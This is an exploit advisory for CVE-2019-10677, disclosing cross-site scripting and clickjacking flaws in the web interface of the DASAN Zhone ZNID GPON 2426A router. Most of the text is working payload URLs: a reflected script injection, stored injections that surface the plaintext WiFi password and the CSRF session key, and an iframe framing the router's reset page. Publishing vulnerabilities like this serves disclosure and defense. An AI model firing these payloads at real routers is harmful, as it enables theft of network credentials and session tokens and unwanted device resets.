Multiple Cross-Site Scripting (XSS) in the web interface of DASAN Zhone ZNID GPON 2426A EU version S3.1.285 application allows a remote attacker to execute arbitrary JavaScript via manipulation of an unsanitized GET parameters.

# Exploit Title: Multiple Cross-Site Scripting (XSS) in DASAN Zhone ZNID GPON 2426A EU

# Date: 31.03.2019

# Exploit Author: Adam Ziaja https://adamziaja.com https://redteam.pl

# Vendor Homepage: https://dasanzhone.com

# Version: <= S3.1.285

# Alternate Version: <= S3.0.738

# Tested on: version S3.1.285 (alternate version S3.0.738)

# CVE : CVE-2019-10677


= Reflected Cross-Site Scripting (XSS) =

http://192.168.1.1/zhndnsdisplay.cmd?fileKey=&name=%3Cscript%3Ealert(1)%3C/script%3E&interface=eth0.v1685.ppp


= Stored Cross-Site Scripting (XSS) =

* WiFi network plaintext password

http://192.168.1.1/wlsecrefresh.wl?wl_wsc_reg=%27;alert(wpaPskKey);//

http://192.168.1.1/wlsecrefresh.wl?wlWscCfgMethod=';alert(wpaPskKey);//

* CSRF token

http://192.168.1.1/wlsecrefresh.wl?wlWscCfgMethod=';alert(sessionKey);//


= Clickjacking =

<html><body><iframe src="http://192.168.1.1/resetrouter.html"></iframe></body></html>